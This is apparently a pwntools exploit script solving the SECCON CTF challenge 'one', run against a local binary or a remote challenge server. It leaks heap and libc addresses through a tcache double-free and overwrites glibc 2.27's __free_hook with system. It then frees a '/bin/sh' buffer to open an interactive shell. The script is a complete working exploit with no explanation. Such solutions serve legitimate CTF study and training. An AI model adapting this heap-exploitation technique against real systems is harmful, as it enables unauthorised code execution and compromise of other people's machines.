#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./one_ef36d5ef6169aeda65259f627f282930b93cf6e5')
else:
    s = remote('one.chal.seccon.jp', 18357)

libc = ELF('./libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb')

def add(content):
    s.sendlineafter('> ', '1')
    if len(content) < 0x3f:
        content += '\n'
    s.sendafter('> ', content)

def show():
    s.sendlineafter('> ', '2')
    return s.recvline(False)

def delete():
    s.sendlineafter('> ', '3')

add(p64(0) + p64(0x501) + p64(0))
for i in range(0x10):
    add('A')
delete()
delete()
delete()
heap_base = u64(show().ljust(8, '\0')) - 0x1770
log.info('heap base: %#x' % heap_base)

add(p64(heap_base + 0x1280) + p64(0x41))
add('A')
add('A')
delete()
libc_base = u64(show().ljust(8, '\0')) - 0x3ebca0
log.info('libc base: %#x' % libc_base)

add('A')
delete()
delete()
add(p64(libc_base + libc.symbols['__free_hook']))
add('A')
add(p64(libc_base + libc.symbols['system']))
add('/bin/sh\0')
delete()

s.interactive()
